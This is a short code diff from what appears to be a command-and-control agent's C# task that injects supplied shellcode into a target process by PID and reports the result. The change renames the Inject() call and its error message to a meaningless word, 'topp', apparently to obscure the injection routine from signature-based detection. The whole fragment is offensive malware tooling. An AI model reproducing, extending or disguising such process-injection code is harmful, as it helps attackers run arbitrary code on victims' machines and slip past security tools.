@@ -50,7 +50,7 @@ namespace Tasks
                         args.Shellcode, out byte[] code))
                 {
                     var technique = _agent.GetInjectionManager().CreateInstance(code, args.PID);
-                    if (technique.Inject())
+                    if (technique.topp())
                     {
                         resp = CreateTaskResponse(
                             $"Injected code into {proc.ProcessName} ({proc.Id})", true, "completed",
@@ -62,7 +62,7 @@ namespace Tasks
                     else
                     {
                         resp = CreateTaskResponse(
-                            $"Failed to inject code into {proc.ProcessName} ({proc.Id}): {Marshal.GetLastWin32Error()}",
+                            $"Failed to topp code into {proc.ProcessName} ({proc.Id}): {Marshal.GetLastWin32Error()}",
                             true,
                             "error");
                     }
